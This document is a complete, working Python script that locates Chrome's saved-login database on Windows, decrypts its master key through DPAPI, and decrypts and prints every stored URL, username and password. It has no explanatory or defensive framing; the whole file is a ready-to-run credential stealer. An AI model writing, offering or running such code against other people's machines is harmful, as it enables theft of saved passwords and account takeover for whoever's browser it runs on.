import os
import json
import base64
import sqlite3
from win32 import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

# get the AES key
key = get_encryption_key()
# local sqlite Chrome database path
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
# copy the file to another location
# as the database will be locked if chrome is currently running
filename = "ChromeData.db"
shutil.copyfile(db_path, filename)
# connect to the database
db = sqlite3.connect(filename)
cursor = db.cursor()
# `logins` table has the data we need
cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
# iterate over all rows
print("[!] Extracting chrome passwords...")
for row in cursor.fetchall():
    origin_url = row[0]
    action_url = row[1]
    username = row[2]
    password = decrypt_password(row[3], key)
    date_created = row[4]
    date_last_used = row[5] 
    if username or password:
        print(f"[+] URL: {origin_url}, Username: {username}, Password: {password}")
    else:
        continue
print(f"[!] Chrome passwords extracted.")

cursor.close()
db.close()
try:
    # try to remove the copied db file
    os.remove(filename)
except:
    pass